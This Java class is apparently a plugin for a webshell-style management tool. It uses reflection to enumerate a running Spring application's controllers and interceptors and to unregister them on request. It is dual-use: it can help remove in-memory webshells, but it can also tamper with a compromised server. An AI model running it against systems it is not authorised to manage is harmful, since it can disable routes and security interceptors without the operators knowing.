package org.leo.core.component;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;

public class SpringFrameworkManageComponent implements Runnable {

    private HashMap params;
    private HashMap results;
    private static Object context;
    private static HashMap interceptorMap=new HashMap();


    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    public void invoke() throws Exception {
        if (context==null){
            context=getContext();
        }
        String methodName = (String) params.get("methodName");
        if ("getFrameworkInfo".equals(methodName)) {
            results.put("frameworkInfo",getFrameworkInfo());
        }
        if ("unLoadController".equals(methodName)) {
            String mappingInfo= (String) params.get("mappingInfo");
            unLoadController(mappingInfo);
        }
        if ("unLoadInterceptor".equals(methodName)) {
            String interceptorId= (String) params.get("interceptorId");
            unLoadInterceptor(interceptorId);
        }
        results.put("code", 200);
    }


    private HashMap getFrameworkInfo() throws Exception {
        HashMap frameworkInfo=new HashMap();
        try {frameworkInfo.put("allController",getAllController());}catch (Exception e){}
        try {frameworkInfo.put("allMappedInterceptor",getAllMappedInterceptor());}catch (Exception e){}
        return frameworkInfo;
    }
    public ArrayList getAllController() throws Exception {
        Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
        Object mappingRegistry;
        try {
            mappingRegistry=invokeMethod(abstractHandlerMapping,"getMappingRegistry");
        }catch (Exception e){
            mappingRegistry=getFV(abstractHandlerMapping,"mappingRegistry");
        }
        Map registry;
        try{
            registry= (Map) invokeMethod(mappingRegistry,"getRegistrations");
        }catch (Exception e){
            registry= (Map) getFV(mappingRegistry,"registry");
        }
        ArrayList allController=new ArrayList();
        Iterator s=registry.keySet().iterator();
        while (s.hasNext()){
            HashMap mapinfo=new HashMap();
            Object key=s.next();
            Object mappingRegistration=registry.get(key);
            mapinfo.put("mappingInfo",key.toString());
            mapinfo.put("mappingName",invokeMethod(mappingRegistration,"getMappingName"));
            try {
                Set directPaths= (Set) invokeMethod(mappingRegistration,"getDirectPaths");
                mapinfo.put("directPaths",directPaths.toArray());
            }catch (Exception e){
                List directUrls= (List) invokeMethod(mappingRegistration,"getDirectUrls");
                mapinfo.put("directPaths",directUrls.toArray());
            }

            Object handlerMethod=invokeMethod(mappingRegistration,"getHandlerMethod");
            mapinfo.put("description",handlerMethod.toString());
            allController.add(mapinfo);
        }
        return allController;
    }


    public void unLoadController(String mappingInfo) throws InvocationTargetException, NoSuchMethodException {
        Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});

        Object mappingRegistry = invokeMethod(abstractHandlerMapping, "getMappingRegistry");
        Map registry = (Map) invokeMethod(mappingRegistry, "getRegistrations");
        Iterator it = new ArrayList(registry.keySet()).iterator();

        while (it.hasNext()) {
            Object key = it.next();
            if (key.toString().equals(mappingInfo)) {invokeMethod(mappingRegistry, "unregister", new Class[]{Object.class}, new Object[]{key});
            }
        }
    }



    public ArrayList getAllMappedInterceptor() throws Exception {
        Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
        Object[] adaptedInterceptors= (Object[]) invokeMethod(abstractHandlerMapping,"getAdaptedInterceptors");
        ArrayList AllMappedInterceptor=new ArrayList();
        for (Object adaptedInterceptor: adaptedInterceptors) {
            HashMap interceptorInfo=new HashMap();
            if (adaptedInterceptor.getClass().getName().equals("org.springframework.web.servlet.handler.MappedInterceptor")){
                Object pathPatterns=invokeMethod(adaptedInterceptor,"getPathPatterns");
                Object interceptor=invokeMethod(adaptedInterceptor,"getInterceptor");
                String interceptorId= String.valueOf(UUID.randomUUID());
                interceptorMap.put(interceptorId,adaptedInterceptor);
                Object[] excludePatterns= (Object[]) getFV(adaptedInterceptor,"excludePatterns");
                ArrayList excludePatternList=new ArrayList();
                if (excludePatterns!=null){
                    for (Object excludePattern:excludePatterns) {
                        excludePatternList.add(invokeMethod(excludePattern,"getPatternString"));
                    }
                }
                interceptorInfo.put("pathPatterns",pathPatterns);
                interceptorInfo.put("interceptorName",interceptor.getClass().getName());
                interceptorInfo.put("excludePatterns",excludePatternList.toArray());
                interceptorInfo.put("interceptorId",interceptorId);
                AllMappedInterceptor.add(interceptorInfo);
            }else {
                String interceptorId= String.valueOf(UUID.randomUUID());
                interceptorMap.put(interceptorId,adaptedInterceptor);
                interceptorInfo.put("pathPatterns",new String[]{"/*"});
                interceptorInfo.put("interceptorName",adaptedInterceptor.getClass().getName());
                interceptorInfo.put("excludePatterns",null);
                interceptorInfo.put("interceptorId",interceptorId);
                AllMappedInterceptor.add(interceptorInfo);
            }
        }
        return AllMappedInterceptor;
    }
    public void unLoadInterceptor(String interceptorId) throws Exception {
        Map handlerMappings= (Map) invokeMethod(context, "getBeansOfType", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.HandlerMapping",false,Thread.currentThread().getContextClassLoader())});
        Set keys=handlerMappings.keySet();
        for (Object key: keys) {
            Object handler=handlerMappings.get(key);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) getFV(handler, "adaptedInterceptors");
            if (adaptedInterceptors!=null){
                adaptedInterceptors.remove(interceptorMap.get(interceptorId));
            }
            ArrayList<Object> interceptors = (ArrayList<Object>) getFV(handler, "interceptors");
            if (interceptors!=null){
                interceptors.remove(interceptorMap.get(interceptorId));
            }
        }
        interceptorMap.remove(interceptorId);
    }

    public static Object getContext() {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object context = null;
        try {
            Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
            Object httprequest = invokeMethod(requestAttributes, "getRequest");
            Object session = invokeMethod(httprequest, "getSession");
            Object servletContext = invokeMethod(session, "getServletContext");
            context = invokeMethod(classLoader.loadClass("org.springframework.web.context.support.WebApplicationContextUtils"), "getWebApplicationContext", new Class[]{classLoader.loadClass("javax.servlet.ServletContext")}, new Object[]{servletContext});
        } catch (Exception e) {
        }
        if (context == null) {
            try {
                LinkedHashSet applicationContexts = (LinkedHashSet) getFV(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
                Object applicationContext = applicationContexts.iterator().next();
                if (classLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(applicationContext.getClass())) {
                    context = applicationContext;
                }
            } catch (Exception ignored) {
            }
        }
        return context;
    }


    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

}
